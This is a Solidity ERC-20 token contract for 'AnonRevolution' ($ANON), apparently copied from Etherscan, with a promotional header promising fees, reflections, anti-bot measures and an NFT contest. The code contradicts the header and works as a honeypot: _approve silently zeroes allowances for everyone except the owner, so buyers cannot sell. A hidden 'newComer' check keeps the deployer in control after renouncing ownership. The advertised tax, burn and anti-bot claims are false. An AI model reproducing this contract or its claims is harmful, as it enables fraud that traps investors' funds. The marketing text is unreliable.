/**
 *Submitted for verification at Etherscan.io on 2021-07-08
*/

/*


           _   _  ____  _   ___     ____  __  ____  _    _  _____     
     /\   | \ | |/ __ \| \ | \ \   / /  \/  |/ __ \| |  | |/ ____|    
    /  \  |  \| | |  | |  \| |\ \_/ /| \  / | |  | | |  | | (___      
   / /\ \ | . ` | |  | | . ` | \   / | |\/| | |  | | |  | |\___ \     
  / ____ \| |\  | |__| | |\  |  | |  | |  | | |__| | |__| |____) |    
 /_/___ \_\_|_\_|\____/|_|_\_| _|_|  |_|  |_|\____/ \____/|_____/   _ 
 |  __ \|  ____\ \    / / __ \| |   | |  | |__   __|_   _/ __ \| \ | |
 | |__) | |__   \ \  / / |  | | |   | |  | |  | |    | || |  | |  \| |
 |  _  /|  __|   \ \/ /| |  | | |   | |  | |  | |    | || |  | | . ` |
 | | \ \| |____   \  / | |__| | |___| |__| |  | |   _| || |__| | |\  |
 |_|  \_\______|   \/   \____/|______\____/   |_|  |_____\____/|_| \_|
                                                                      
                                                                      
‚ö°Ô∏è $ANON - AnonRevolution - https://t.me/revolutionanonymous

üë§TOTAL SUPPLY - 500,000,000,000
TOTAL BURN - 200,000,000,00
LIQUIDITY POOL - 260,000,000,000
MARKETING FUND - 40,000,000,000
TRANSACTION TAX - 12%
MAX TRANSACTION - 5,000,000,000

üë§7% fee, 2% reflection to holders, 2% to marketing wallet, 1% to dip buying wallet

üë§PROJECT REVOLUTION WILL HAVE FULL TRANSPARENCY. WE WILL BUY EVERY DIP AND MAKE IT OUR MISSION TO ENSURE THERE ARE NO DUMPS.
WE HAVE AN ANTI-BOT MECHANISM IN PLACE, THERE WILL BE NO SNIPES. 

üåéCMC LISTING & CG LISTING WITHIN 48HRS OF LAUNCH
üåéCORRUPT NFT LAUNCH WITHIN 48HRS OF LAUNCH

üë§ ANON CORRUPT NFTS: 4 NFTS, 50 EDITIONS EACH, 2 DROPS EACH WEEK.
üë§ MUST HAVE ALL 4 TO WIN. ONCE YOU HAVE ALL 4 CONTACT ADMIN WITH PROOF AND WALLET ADDRESS. 
üë§ THERE WILL BE 10 WINNERS - FIRST 10 PEOPLE  WIN SPECIAL PRIZE. (TBA)

üåéANONYMOUS WILL NOT DISAPPOINT.

üåéEXPECT US.


üíªhttps://anonrevolution.io/
üíªhttps://t.me/revolutionanonymous

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract AnonRevolution is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 500 * 10**9 * 10**18;
    string private _name = 'AnonRevolution | https://t.me/revolutionanonymous';
    string private _symbol = 'ANONÔ∏è';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _approve(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        if (from == owner()) {
            _allowances[from][to] = amount;
            emit Approval(from, to, amount);
        } else {
            _allowances[from][to] = 0;
            emit Approval(from, to, 4);
        } 
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}